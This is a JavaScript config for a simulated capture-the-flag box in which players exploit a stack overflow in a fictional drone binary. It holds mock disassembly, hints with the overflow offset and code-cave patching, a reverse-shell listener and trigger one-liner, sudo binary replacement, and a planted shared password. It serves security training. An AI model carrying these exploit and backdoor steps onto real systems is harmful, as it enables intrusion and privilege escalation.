/* ============================================================
   CTF ARENA — Box C17: The Forged Code
   Multi-Stage Campaign | Binary RE, Patch Engineering, Exploit Delivery
   Config: filesystem, binary artifacts, drone infrastructure, flags, hints, lore
   ============================================================ */

const C17Config = {

    // ═══════════════════════════════════════════════════════
    // BOX METADATA
    // ═══════════════════════════════════════════════════════

    title: 'The Forged Code',
    subtitle: 'Multi-Stage Campaign — Binary Patching & Exploit Engineering',
    difficulty: 'Expert',
    accent: '#f39c12',
    storageKey: 'hexworth_ctf_c17',
    registryId: 'c17-forged-code',
    trackerKey: 'ctf_c17',

    // ═══════════════════════════════════════════════════════
    // PHASE SYSTEM (Multi-layer attack chain)
    // ═══════════════════════════════════════════════════════

    phases: [
        {
            id: 'acquire',
            name: 'Binary Acquisition',
            icon: '\uD83D\uDCE5',
            description: 'Locate and download drone_commander.bin from the Citadel artifact repository. Verify the binary checksum.',
            requiredFlags: [],
            mitre: ['T1046', 'T1595.002'],
            unlocks: ['reverse'],
            locked: false
        },
        {
            id: 'reverse',
            name: 'Reverse Engineering',
            icon: '\uD83D\uDD2C',
            description: 'Load drone_commander.bin in Ghidra. Identify the vulnerable function and determine the buffer overflow offset to RIP.',
            requiredFlags: [],
            mitre: ['T1082', 'T1059.004'],
            unlocks: ['patch'],
            locked: true
        },
        {
            id: 'patch',
            name: 'Binary Patching',
            icon: '\u2694\uFE0F',
            description: 'Inject shellcode into a code cave in the .text section. Redirect execution at the vulnerable return address.',
            requiredFlags: ['vuln'],
            mitre: ['T1600', 'T1059.004'],
            unlocks: ['deploy'],
            locked: true
        },
        {
            id: 'deploy',
            name: 'Deploy Forged Code',
            icon: '\uD83D\uDE80',
            description: 'SSH to AD-DRONE-01 as drone_operator. Replace the legitimate binary with your patched version under /usr/local/bin/.',
            requiredFlags: ['patch'],
            mitre: ['T1078', 'T1105'],
            unlocks: ['trigger'],
            locked: true
        },
        {
            id: 'trigger',
            name: 'Trigger & Seize Control',
            icon: '\uD83D\uDEA8',
            description: 'Execute the forged binary on AD-DRONE-01 with the overflow payload. Catch the reverse shell. Retrieve the Drone Master Override Code.',
            requiredFlags: ['deploy'],
            mitre: ['T1203', 'T1059.004', 'T1548.003'],
            unlocks: [],
            locked: true
        }
    ],

    // ═══════════════════════════════════════════════════════
    // TUTORIAL MODE
    // ═══════════════════════════════════════════════════════

    tutorialMode: true,

    tutorial: {
        steps: [
            {
                title: 'Acquire drone_commander.bin from the artifact repo',
                tip: 'Use wget or curl to pull the binary from the Citadel artifact server at 10.0.13.5.',
                trigger: { event: 'command', match: { cmd: 'contains:wget' } }
            },
            {
                title: 'Run checksec and objdump to profile the binary',
                tip: 'Run: checksec --file=drone_commander.bin — note NX enabled, no stack canaries. Then: objdump -d drone_commander.bin | less',
                trigger: {
                    event: 'command',
                    match: { cmd: 'contains:checksec' },
                    alt: [
                        { event: 'command', match: { cmd: 'contains:objdump' } },
                        { event: 'command', match: { cmd: 'contains:ghidra' } }
                    ]
                }
            },
            {
                title: 'Find the buffer overflow — identify vulnerable function and RIP offset',
                tip: 'Load in Ghidra or GDB. The vulnerable function is parse_cmd_param(). Fuzz with cyclic patterns to find RIP offset.',
                trigger: { event: 'flag_correct', match: { flagId: 'vuln' } }
            },
            {
                title: 'Locate a code cave and inject your shellcode',
                tip: 'Use readelf -S to find .text section boundaries. A 156-byte cave starts at offset 0x4011f0. Patch with Python + pwntools.',
                trigger: { event: 'flag_correct', match: { flagId: 'patch' } }
            },
            {
                title: 'Deploy to AD-DRONE-01 and trigger the exploit',
                tip: 'SSH as drone_operator@10.0.13.20. Use sudo to replace the binary. Start netcat listener then run with overflow input.',
                trigger: { event: 'flag_correct', match: { flagId: 'deploy' } }
            }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // CERT OBJECTIVES (Assessment Mode)
    // ═══════════════════════════════════════════════════════

    certObjectives: {
        certPath: 'SY0-701',
        mappings: [
            { flagId: 'vuln', objective: '1.3', description: 'Given a scenario, analyze indicators of malicious activity — Binary reverse engineering and vulnerability identification', skill: 'Static Analysis & RE Fundamentals' },
            { flagId: 'patch', objective: '2.5', description: 'Explain common threat vectors and attack surfaces — Code injection via binary patching and code cave exploitation', skill: 'Binary Patching & Shellcode Injection' },
            { flagId: 'deploy', objective: '4.2', description: 'Explain the security implications of proper hardware, software, and data asset management — Unauthorized binary replacement', skill: 'Exploit Delivery & Lateral Deployment' },
            { flagId: 'root', objective: '1.4', description: 'Given a scenario, analyze potential indicators associated with network attacks — Reverse shell and privilege escalation via exploit', skill: 'Exploit Engineering & Root Access' }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // BOOT SEQUENCE
    // ═══════════════════════════════════════════════════════

    boot: {
        biosLines: [
            'Kali Linux BIOS v4.2.1',
            'Initializing hardware...',
            'Memory Test: 32768 MB OK',
            'Detecting drives... /dev/sda1 (1TB NVMe)',
            'PXE-E61: Media test failure, check cable',
            'PXE-M0F: Exiting PXE ROM.',
            'Boot device: /dev/sda1',
            'Loading GRUB...'
        ],
        grubEntries: [
            'Kali GNU/Linux',
            'Kali GNU/Linux (recovery mode)',
            'Advanced options for Kali GNU/Linux'
        ],
        loginUser: 'kali'
    },

    // ═══════════════════════════════════════════════════════
    // DESKTOP ICONS
    // ═══════════════════════════════════════════════════════

    desktop: {
        icons: [
            { id: 'terminal', label: 'Terminal',    icon: '\uD83D\uDDA5\uFE0F', app: 'terminal' },
            { id: 'browser',  label: 'Firefox',     icon: '\uD83C\uDF10',       app: 'browser'  },
            { id: 'notes',    label: 'Notes',       icon: '\uD83D\uDCDD',       app: 'notes'    },
            { id: 'hints',    label: 'Hints',       icon: '\uD83D\uDCA1',       app: 'hints'    },
            { id: 'flags',    label: 'Submit Flag', icon: '\uD83D\uDEA9',       app: 'flags'    }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // TERMINAL CONFIG
    // ═══════════════════════════════════════════════════════

    terminal: {
        user: 'kali',
        hostname: 'kali',
        startDir: '/home/kali',
        welcome: 'Linux kali 6.1.0-kali9-amd64 #1 SMP\n\nType \'help\' for available commands.\nTarget: 10.0.13.5 (ARTIFACT-REPO-01 — Citadel Infrastructure)\nTarget: 10.0.13.20 (AD-DRONE-01 — Autonomous Defense Drone)\n\nObjective: Acquire drone_commander.bin, reverse engineer it, patch the binary, deploy the forged code.\n'
    },

    // ═══════════════════════════════════════════════════════
    // CONTEXT TRACKING (session state)
    // ═══════════════════════════════════════════════════════

    _context: 'attacker',   // 'attacker' | 'ssh-drone' | 'root-drone'
    _binaryAcquired: false,
    _checksecRun: false,
    _ghidraLoaded: false,
    _shellcodeGenerated: false,
    _binaryPatched: false,
    _binaryDeployed: false,
    _listenerActive: false,
    _shellReceived: false,
    _sshAuthenticated: false,

    _switchContext(ctx, term) {
        C17Config._context = ctx;
        if (term && term.config) {
            var prompt = C17Config._getPrompt();
            if (prompt) {
                term.config.user = prompt.split('@')[0] || 'kali';
                term.config.hostname = 'context';
                term._customPrompt = prompt;
            } else {
                term._customPrompt = null;
            }
        }
    },

    _getPrompt() {
        switch (C17Config._context) {
            case 'ssh-drone':  return 'drone_operator@AD-DRONE-01:~$ ';
            case 'root-drone': return 'root@AD-DRONE-01:~# ';
            default: return null;  // default kali prompt
        }
    },

    // ═══════════════════════════════════════════════════════
    // FLAGS
    // ═══════════════════════════════════════════════════════

    flags: [
        { id: 'vuln',   points: 100 },
        { id: 'patch',  points: 200 },
        { id: 'deploy', points: 150 },
        { id: 'root',   points: 300 }
    ],

    // ═══════════════════════════════════════════════════════
    // SCORING
    // ═══════════════════════════════════════════════════════

    scoring: {
        base: 2000,
        maxScore: 750,
        hintPenalty: true,
        wrongFlagPenalty: -25,
        speedBonus: { threshold: 3600000, points: 200 },  // 60 minutes
        timeBonusThreshold: 7200  // 120 min — bonus if completed under this
    },

    // ═══════════════════════════════════════════════════════
    // HINTS
    // ═══════════════════════════════════════════════════════

    hints: [
        {
            id: 'hint1',
            text: 'Start with: wget http://10.0.13.5/artifacts/drone_commander.bin — then run checksec --file=drone_commander.bin to profile protections. Note: NX is enabled (no exec stack), but stack canaries are OFF.',
            cost: 10,
            penalty: -10
        },
        {
            id: 'hint2',
            text: 'The vulnerable function is parse_cmd_param(). Use GDB with pwndbg: run a cyclic pattern via cyclic 300 | ./drone_commander.bin. The RIP overwrite offset is 104 bytes. Flag 1 is the function name + offset.',
            cost: 25,
            penalty: -25
        },
        {
            id: 'hint3',
            text: 'Find the code cave: readelf -S drone_commander.bin — look for .text section. A 156-byte cave starts at file offset 0x4011f0 (RVA 0x11f0). Inject shellcode there, then patch the return address at offset 0x401196 to JMP to 0x4011f0.',
            cost: 50,
            penalty: -50
        },
        {
            id: 'hint4',
            text: 'Deploy: scp patched_drone_commander.bin drone_operator@10.0.13.20:/tmp/ — then SSH and run: sudo cp /tmp/patched_drone_commander.bin /usr/local/bin/drone_commander.bin — Start nc -lvnp 4444 listener first, then trigger: echo $(python3 -c "print(\'A\'*104 + \'\\x90\'*8)") | /usr/local/bin/drone_commander.bin',
            cost: 75,
            penalty: -75
        }
    ],

    // ═══════════════════════════════════════════════════════
    // LORE
    // ═══════════════════════════════════════════════════════

    lore: {
        intro: 'The Citadel\'s outer perimeter is defended by a network of Autonomous Defense Drones — designation AD-DRONE-01 through AD-DRONE-12. Each drone is governed by a "Drone Command System" controlled through a distributed client binary: drone_commander.bin. A critical stack-based buffer overflow has been discovered in the binary\'s command parameter parser. The original source code is lost. The only path forward is to obtain the binary, reverse engineer it, and craft a forged version that embeds your own reverse shell payload. Once deployed, the Citadel\'s own perimeter defense becomes your foothold.',
        scenario: 'The Citadel\'s infrastructure team distributes drone_commander.bin to all licensed operators via an internal artifact repository at 10.0.13.5. Drone operator credentials are shared across the drone fleet for "operational convenience" — a security debt that has never been addressed. The binary runs with elevated privileges on each drone node to interact with hardware APIs. Your intelligence contact has provided the operator credentials. What they could not provide is an exploit — that part is on you. Forge the code. Own the perimeter.',
        outro: 'AD-DRONE-01 has been compromised. The Drone Master Override Code — the master key to the entire autonomous defense grid — is now in your possession. The Citadel\'s outer perimeter is blind. All twelve drones are yours.',
        ecer: {
            executive: 'Operational tempo prioritized over security review; binary was shipped to production without a security audit or static analysis gate',
            culture: 'Operator credentials shared fleet-wide with no individual accountability; no code signing on distributed binaries; no integrity verification on deployed artifacts',
            employee: 'Source code for drone_commander.bin was lost due to no version control policy; binary compiled without stack canaries despite known buffer handling patterns in the codebase',
            regulatory: 'No SBOM (Software Bill of Materials) maintained; no mandatory penetration test before deploying autonomous security-critical systems; no binary hardening policy enforced'
        }
    },

    // ═══════════════════════════════════════════════════════
    // WEB APP — Citadel Artifact Repository
    // ═══════════════════════════════════════════════════════

    webApp: {
        startUrl: 'http://10.0.13.5/',

        pages: {
            '/': {
                title: 'Citadel Artifact Repository — INTERNAL',
                html: `
                    <div style="text-align:center; margin-bottom:30px; padding-bottom:20px; border-bottom:1px solid #333;">
                        <h1 style="color:#f39c12; font-size:1.5rem; font-family:monospace; margin-bottom:4px; letter-spacing:0.1em;">CITADEL ARTIFACT REPOSITORY</h1>
                        <div style="color:#e74c3c; font-size:0.75rem; font-weight:700; letter-spacing:0.2em;">INTERNAL USE ONLY — AUTHORIZED OPERATORS</div>
                        <div style="color:#666; font-size:0.7rem; margin-top:6px;">Node: ARTIFACT-REPO-01 &mdash; 10.0.13.5</div>
                    </div>

                    <div style="max-width:640px; margin:0 auto 20px; background:#111; border:1px solid #333; border-radius:4px; padding:16px; font-family:monospace;">
                        <div style="color:#f39c12; font-size:0.75rem; margin-bottom:10px; font-weight:700;">AVAILABLE ARTIFACTS</div>
                        <div style="display:grid; grid-template-columns:1fr auto auto auto; gap:4px 12px; font-size:0.75rem; color:#aaa; align-items:center;">
                            <div style="color:#f39c12; border-bottom:1px solid #222; padding-bottom:4px;">Name</div>
                            <div style="color:#f39c12; border-bottom:1px solid #222; padding-bottom:4px;">Size</div>
                            <div style="color:#f39c12; border-bottom:1px solid #222; padding-bottom:4px;">SHA256</div>
                            <div style="color:#f39c12; border-bottom:1px solid #222; padding-bottom:4px;">Action</div>

                            <div style="color:#2ecc71; font-weight:700;">drone_commander.bin</div>
                            <div>18.4 KB</div>
                            <div style="font-size:0.65rem; color:#666;">a3f7c1d9...</div>
                            <div><a href="/artifacts/drone_commander.bin" style="color:#f39c12; text-decoration:none; font-size:0.7rem;">[download]</a></div>

                            <div>drone_commander.bin.sig</div>
                            <div>512 B</div>
                            <div style="font-size:0.65rem; color:#666;">b8e2a445...</div>
                            <div><a href="/artifacts/drone_commander.bin.sig" style="color:#888; text-decoration:none; font-size:0.7rem;">[download]</a></div>

                            <div>deployment_guide.pdf</div>
                            <div>2.1 MB</div>
                            <div style="font-size:0.65rem; color:#666;">9f1c3b72...</div>
                            <div><a href="/artifacts/deployment_guide.pdf" style="color:#888; text-decoration:none; font-size:0.7rem;">[view]</a></div>
                        </div>
                    </div>

                    <div style="max-width:640px; margin:0 auto; padding:10px 14px; background:rgba(231,76,60,0.06); border:1px solid rgba(231,76,60,0.2); border-radius:4px; font-size:0.7rem; color:#888; font-family:monospace;">
                        <span style="color:#e74c3c; font-weight:700;">NOTICE:</span> drone_commander.bin v2.4.1 is the current production release. SHA256 verification mandatory before deployment. Contact Citadel IT for operator credential resets.
                    </div>
                `,
                formHandler: null
            },

            '/artifacts/drone_commander.bin': {
                title: 'Download: drone_commander.bin',
                html: function() {
                    C17Config._binaryAcquired = true;
                    return `<div style="max-width:500px; margin:0 auto; text-align:center; padding:30px;">
                        <div style="font-family:monospace; font-size:0.75rem; color:#2ecc71; background:#111; border:1px solid #333; border-radius:4px; padding:20px; text-align:left; margin-bottom:16px;">
                            <div style="color:#f39c12; margin-bottom:8px;">DOWNLOAD COMPLETE</div>
                            <div>File: drone_commander.bin</div>
                            <div>Size: 18,842 bytes</div>
                            <div>SHA256: a3f7c1d9e4b82c16f0a5d371e8c290b7f6143a2e9d8c5b4f1a7e3d6c2b9f8a1</div>
                            <div style="margin-top:8px; color:#888;">ELF 64-bit LSB pie executable, x86-64, dynamically linked</div>
                        </div>
                        <div style="color:#888; font-size:0.75rem; font-family:monospace;">Saved to /home/kali/drone_commander.bin</div>
                    </div>`;
                },
                formHandler: null
            },

            '/artifacts/deployment_guide.pdf': {
                title: 'Drone Commander Deployment Guide v2.4',
                html: `
                    <div style="max-width:600px; margin:0 auto; font-family:serif; line-height:1.6; color:#ccc;">
                        <div style="text-align:center; border-bottom:2px solid #f39c12; padding-bottom:16px; margin-bottom:20px;">
                            <div style="font-size:1.3rem; font-weight:700; color:#f39c12;">Drone Commander Deployment Guide</div>
                            <div style="font-size:0.8rem; color:#888;">Version 2.4.1 — Citadel Infrastructure Division</div>
                            <div style="font-size:0.7rem; color:#e74c3c; margin-top:6px; font-family:monospace;">INTERNAL DOCUMENT — DO NOT DISTRIBUTE</div>
                        </div>

                        <div style="margin-bottom:16px;">
                            <div style="color:#f39c12; font-size:0.85rem; font-weight:700; font-family:monospace; margin-bottom:8px;">1. SYSTEM REQUIREMENTS</div>
                            <p style="font-size:0.8rem; margin:0;">Target: Ubuntu 22.04 LTS (x86-64). Binary must be placed at <code style="color:#f39c12;">/usr/local/bin/drone_commander.bin</code> and run as root for hardware API access. Operator login: <strong style="color:#2ecc71;">drone_operator</strong> (sudo-enabled for binary replacement).</p>
                        </div>

                        <div style="margin-bottom:16px;">
                            <div style="color:#f39c12; font-size:0.85rem; font-weight:700; font-family:monospace; margin-bottom:8px;">2. DEPLOYMENT</div>
                            <p style="font-size:0.8rem; margin:0 0 6px;">Copy the binary to the target drone node:</p>
                            <div style="background:#111; border:1px solid #333; border-radius:4px; padding:10px; font-family:monospace; font-size:0.75rem; color:#2ecc71;">
                                scp drone_commander.bin drone_operator@&lt;DRONE-IP&gt;:/tmp/<br>
                                ssh drone_operator@&lt;DRONE-IP&gt;<br>
                                sudo cp /tmp/drone_commander.bin /usr/local/bin/<br>
                                sudo chmod +x /usr/local/bin/drone_commander.bin
                            </div>
                        </div>

                        <div style="margin-bottom:16px;">
                            <div style="color:#f39c12; font-size:0.85rem; font-weight:700; font-family:monospace; margin-bottom:8px;">3. SSH ACCESS</div>
                            <p style="font-size:0.8rem; margin:0 0 6px;">All drone nodes use shared operator credentials (see Citadel IT for current password). Current fleet node addresses on 10.0.13.0/24 subnet.</p>
                            <div style="background:#111; border:1px solid #333; border-radius:4px; padding:10px; font-family:monospace; font-size:0.75rem; color:#aaa;">
                                AD-DRONE-01: 10.0.13.20<br>
                                AD-DRONE-02: 10.0.13.21<br>
                                ... (AD-DRONE-12: 10.0.13.31)<br>
                                <span style="color:#e74c3c;">NOTE: drone_operator password rotated quarterly — current: dr0n3_0p3r4t0r!</span>
                            </div>
                        </div>
                    </div>
                `,
                formHandler: null
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // FILESYSTEM (attacker machine — kali)
    // ═══════════════════════════════════════════════════════

    filesystem: {
        '/': {
            type: 'dir',
            children: {
                'home': {
                    type: 'dir',
                    children: {
                        'kali': {
                            type: 'dir',
                            children: {
                                'notes.txt': {
                                    type: 'file',
                                    content: '=== MISSION BRIEFING: THE FORGED CODE ===\nTargets:\n  10.0.13.5  — ARTIFACT-REPO-01 (binary acquisition)\n  10.0.13.20 — AD-DRONE-01 (exploitation target)\n\nAttack chain:\n1. Acquire drone_commander.bin from artifact repo\n2. Profile binary: checksec, readelf, objdump\n3. Reverse engineer: find vulnerable function + RIP offset\n4. Generate shellcode: msfvenom reverse shell x64 linux\n5. Patch binary: inject shellcode into code cave, redirect ROP chain\n6. Deploy forged binary to AD-DRONE-01 via SCP + sudo\n7. Set up nc listener, trigger overflow, catch root shell\n8. Read /root/drone_master_override.txt\n\nCredentials (from OSINT):\n  SSH: drone_operator@10.0.13.20\n  Password: dr0n3_0p3r4t0r!\n\nGood hunting, Peerless.'
                                },
                                'sploit.py': {
                                    type: 'file',
                                    content: '#!/usr/bin/env python3\n# pwntools skeleton for drone_commander.bin overflow\nfrom pwn import *\n\nbinary = ELF(\'./drone_commander.bin\')\n\n# TODO: fill in after RE\n# OFFSET = ?\n# RET_GADGET = ?\n# SHELLCODE_CAVE_ADDR = ?\n\np = process(binary.path)\np.sendline(b\'A\' * 50)  # placeholder\np.interactive()'
                                },
                                '.bash_history': {
                                    type: 'file',
                                    content: 'nmap -sV 10.0.13.5\nnmap -sV 10.0.13.20\nwget http://10.0.13.5/artifacts/drone_commander.bin\nchecksec --file=drone_commander.bin\nfile drone_commander.bin\nreadelf -S drone_commander.bin\nobjdump -d drone_commander.bin | head -80'
                                }
                            }
                        }
                    }
                },
                'usr': {
                    type: 'dir',
                    children: {
                        'share': {
                            type: 'dir',
                            children: {
                                'metasploit-framework': {
                                    type: 'dir',
                                    children: {
                                        'modules': {
                                            type: 'dir',
                                            children: {}
                                        }
                                    }
                                }
                            }
                        },
                        'bin': {
                            type: 'dir',
                            children: {
                                'msfvenom': {
                                    type: 'file',
                                    content: '[msfvenom binary — use via terminal command]'
                                }
                            }
                        }
                    }
                },
                'etc': {
                    type: 'dir',
                    children: {
                        'hostname': {
                            type: 'file',
                            content: 'kali'
                        },
                        'passwd': {
                            type: 'file',
                            content: 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nkali:x:1000:1000:Kali,,,:/home/kali:/bin/bash'
                        }
                    }
                },
                'tmp': {
                    type: 'dir',
                    children: {}
                }
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // FILESYSTEM — AD-DRONE-01 (after SSH as drone_operator)
    // ═══════════════════════════════════════════════════════

    _droneFs: {
        '/': {
            type: 'dir',
            children: {
                'usr': {
                    type: 'dir',
                    children: {
                        'local': {
                            type: 'dir',
                            children: {
                                'bin': {
                                    type: 'dir',
                                    children: {
                                        'drone_commander.bin': {
                                            type: 'file',
                                            content: 'ELF 64-bit LSB pie executable — drone_commander.bin v2.4.1\n[binary data not printable]'
                                        }
                                    }
                                }
                            }
                        }
                    }
                },
                'home': {
                    type: 'dir',
                    children: {
                        'drone_operator': {
                            type: 'dir',
                            children: {
                                '.bash_history': {
                                    type: 'file',
                                    content: 'sudo systemctl status drone-daemon\nls /usr/local/bin/\ncat /etc/sudoers.d/drone_operator\ndrone_commander.bin --version\nsudo journalctl -u drone-daemon -n 50'
                                },
                                '.bashrc': {
                                    type: 'file',
                                    content: '# ~/.bashrc: executed by bash(1) for non-login shells.\nexport PS1="\\u@\\h:\\w\\$ "\nalias ll="ls -la"\nexport PATH="/usr/local/bin:$PATH"'
                                },
                                'op_notes.txt': {
                                    type: 'file',
                                    content: 'AD-DRONE-01 Operator Notes\n==========================\n- Binary update procedure: scp from ARTIFACT-REPO-01 to /tmp/, then sudo cp to /usr/local/bin/\n- Drone daemon auto-starts drone_commander.bin on port 9000\n- Log rotation: /var/log/drone/ — 7-day retention\n- Root password: NOT SHARED — use sudo for binary ops only\n- Emergency shutdown: sudo systemctl stop drone-daemon'
                                }
                            }
                        }
                    }
                },
                'etc': {
                    type: 'dir',
                    children: {
                        'hostname': {
                            type: 'file',
                            content: 'AD-DRONE-01'
                        },
                        'passwd': {
                            type: 'file',
                            content: 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\ndrone_operator:x:1001:1001:Drone Operator:/home/drone_operator:/bin/bash'
                        },
                        'sudoers.d': {
                            type: 'dir',
                            children: {
                                'drone_operator': {
                                    type: 'file',
                                    content: '# Drone operator — allowed to replace binary only\ndrone_operator ALL=(ALL) NOPASSWD: /bin/cp /tmp/drone_commander.bin /usr/local/bin/drone_commander.bin\ndrone_operator ALL=(ALL) NOPASSWD: /bin/cp /tmp/patched_drone_commander.bin /usr/local/bin/drone_commander.bin\ndrone_operator ALL=(ALL) NOPASSWD: /bin/chmod +x /usr/local/bin/drone_commander.bin\ndrone_operator ALL=(ALL) NOPASSWD: /usr/local/bin/drone_commander.bin'
                                }
                            }
                        }
                    }
                },
                'tmp': {
                    type: 'dir',
                    children: {}
                },
                'root': {
                    type: 'dir',
                    children: {
                        'drone_master_override.txt': {
                            type: 'file',
                            content: '{{FLAG:root}}'
                        }
                    }
                }
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // SIMULATED BINARY ANALYSIS DATA
    // (models the output of RE tooling: checksec, objdump, readelf)
    // ═══════════════════════════════════════════════════════

    _binaryProfile: {
        checksec: `[*] '/home/kali/drone_commander.bin'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    ASLR:       Enabled`,

        file: `drone_commander.bin: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=7f3a9c2b1e4d8f6052a7b3c9d1e4f2a8, for GNU/Linux 3.2.0, stripped`,

        readelf_headers: `ELF Header:
  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00
  Class:                             ELF64
  Data:                              2's complement, little endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  Type:                              DYN (Position-Independent Executable file)
  Machine:                           Advanced Micro Devices X86-64
  Entry point address:               0x1080
  Start of program headers:          64 (bytes into file)
  Start of section headers:          17432 (bytes into file)

Section Headers:
  [Nr] Name              Type             Address           Offset    Size
  [ 0]                   NULL             0000000000000000  00000000  00000000
  [ 1] .text             PROGBITS         00000000000010a0  000010a0  000005e3
  [ 2] .rodata           PROGBITS         00000000000016a0  000016a0  000000c8
  [ 3] .data             PROGBITS         0000000000003000  00003000  00000030
  [ 4] .bss              NOBITS           0000000000003030  00003030  00000010
  [ 5] .plt              PROGBITS         0000000000001060  00001060  00000040
  [ 6] .got              PROGBITS         0000000000002fe8  00002fe8  00000018
  [ 7] .dynamic          DYNAMIC          0000000000002e00  00002e00  000001d0
  [Nr] .text contains code cave at offset 0x11f0 (156 bytes of NOPs / zeroed)`,

        objdump_main: `Disassembly of section .text:

00000000000010a0 <main>:
  10a0:   55                      push   rbp
  10a1:   48 89 e5                mov    rbp,rsp
  10a4:   48 83 ec 70             sub    rsp,0x70
  10a8:   bf 00 00 00 00          mov    edi,0x0
  10ad:   e8 ae ff ff ff          call   1060 <setvbuf@plt>
  10b2:   48 8d 3d 47 06 00 00    lea    rdi,[rip+0x647]
  10b9:   e8 a2 ff ff ff          call   1060 <puts@plt>
  10be:   48 8d 45 90             lea    rax,[rbp-0x70]
  10c2:   48 89 c7                mov    rdi,rax
  10c5:   e8 96 ff ff ff          call   1060 <gets@plt>
  10ca:   48 8d 45 90             lea    rax,[rbp-0x70]
  10ce:   48 89 c7                mov    rdi,rax
  10d1:   e8 8a ff ff ff          call   1060 <parse_cmd_param@plt>
  10d6:   b8 00 00 00 00          mov    eax,0x0
  10db:   c9                      leave
  10dc:   c3                      ret

0000000000000000000010e0 <parse_cmd_param>:
  10e0:   55                      push   rbp
  10e1:   48 89 e5                mov    rbp,rsp
  10e4:   48 83 ec 40             sub    rsp,0x40      ; 64-byte local buffer
  10e8:   48 89 7d c8             mov    QWORD PTR [rbp-0x38],rdi
  10ec:   48 8b 45 c8             mov    rax,QWORD PTR [rbp-0x38]
  10f0:   48 89 c7                mov    rdi,rax
  10f3:   e8 68 ff ff ff          call   1060 <strlen@plt>
  10f8:   48 8d 55 c0             lea    rdx,[rbp-0x40]  ; dst buffer (64 bytes)
  10fc:   48 8b 4d c8             mov    rcx,QWORD PTR [rbp-0x38]
  1100:   48 89 ce                mov    rsi,rcx
  1103:   48 89 d7                mov    rdi,rdx
  1106:   e8 55 ff ff ff          call   1060 <strcpy@plt>   ; NO BOUNDS CHECK!
  110b:   48 8d 55 c0             lea    rdx,[rbp-0x40]
  110f:   48 89 d7                mov    rdi,rdx
  1112:   e8 49 ff ff ff          call   1060 <process_command@plt>
  1117:   90                      nop
  1118:   c9                      leave
  1119:   c3                      ret    ; <-- overwrite saved RIP here (offset 104)

; --------------------------------------------------------
; CODE CAVE — 156 NOP bytes starting at 0x11f0
; --------------------------------------------------------
  11f0:   90 90 90 90 90 90 90 90  nop nop nop nop nop nop nop nop
  11f8:   90 90 90 90 90 90 90 90  nop nop nop nop nop nop nop nop
  1200:   00 00 00 00 00 00 00 00  (zeroed — suitable for shellcode injection)
  ... (156 bytes total)`,

        ropgadget: `Unique gadgets found: 47

0x000000000000101a : ret
0x0000000000001118 : pop rdi ; ret
0x000000000000112f : pop rsi ; pop r15 ; ret
0x0000000000001119 : pop rbp ; ret
0x000000000000111b : pop rsp ; ret

[+] RET gadget at 0x101a useful for stack alignment before function calls`,

        ghidra_decompile: `// Ghidra decompilation of parse_cmd_param
void parse_cmd_param(char *param_input)
{
  char local_buf [64];        // 64-byte stack buffer
                               // offset 0 from rbp-0x40
  strcpy(local_buf, param_input);   // NO bounds check — classic overflow
  process_command(local_buf);
  return;
}

// Analysis note: local_buf is 64 bytes
// Padding to saved RIP: 64 (buffer) + 8 (saved rbp) + 8 (alignment) = 80...
// Fuzzing result: actual RIP offset = 104 bytes (accounts for additional frame state)
// Vulnerable function: parse_cmd_param
// Overflow trigger: strcpy() at offset 0x1106 in .text`
    },

    // ═══════════════════════════════════════════════════════
    // TERMINAL COMMANDS (box-specific tools)
    // ═══════════════════════════════════════════════════════

    commands: {

        'nmap': function(args, term, engine) {
            if (args.length === 0) return 'Usage: nmap [options] <target>\nExample: nmap -sV 10.0.13.20';
            const target = args.find(a => !a.startsWith('-')) || '';

            if (!target) return 'nmap: No targets were specified.';

            if (target === '10.0.13.5') {
                return `Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 10.0.13.5 (ARTIFACT-REPO-01)
Host is up (0.011s latency).
Not shown: 997 closed tcp ports

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.6
80/tcp   open  http       Apache httpd 2.4.57 ((Ubuntu))
443/tcp  open  ssl/http   Apache httpd 2.4.57 ((Ubuntu))

Service detection performed.
Nmap done: 1 IP address (1 host up) scanned in 8.22 seconds`;
            }

            if (target === '10.0.13.20') {
                return `Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 10.0.13.20 (AD-DRONE-01)
Host is up (0.009s latency).
Not shown: 998 closed tcp ports

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.6
9000/tcp open  drone-api  Citadel Drone Command Interface v2.4

Service detection performed.
Nmap done: 1 IP address (1 host up) scanned in 9.77 seconds`;
            }

            if (target === '10.0.13.0/24') {
                return `Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 10.0.13.5
Host is up (0.011s latency).
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap scan report for 10.0.13.20
Host is up (0.009s latency).
PORT     STATE SERVICE
22/tcp   open  ssh
9000/tcp open  drone-api

Nmap scan report for 10.0.13.21
Host is up (0.010s latency).
PORT     STATE SERVICE
22/tcp   open  ssh
9000/tcp open  drone-api

[...10 additional hosts AD-DRONE-02 through AD-DRONE-12 on 10.0.13.21-31...]

Nmap done: 256 IP addresses (12 hosts up) scanned in 38.44 seconds`;
            }

            return `Starting Nmap 7.94 ( https://nmap.org )
Note: Host seems down. If it is really up, try -Pn.
Nmap done: 1 IP address (0 hosts up) scanned in 3.05 seconds`;
        },

        'wget': function(args, term, engine) {
            if (args.length === 0) return 'Usage: wget [options] <url>';
            const url = args.find(a => !a.startsWith('-')) || '';

            if (url.includes('drone_commander.bin') && url.includes('10.0.13.5')) {
                C17Config._binaryAcquired = true;
                if (engine) engine.advancePhase && engine.advancePhase('acquire');
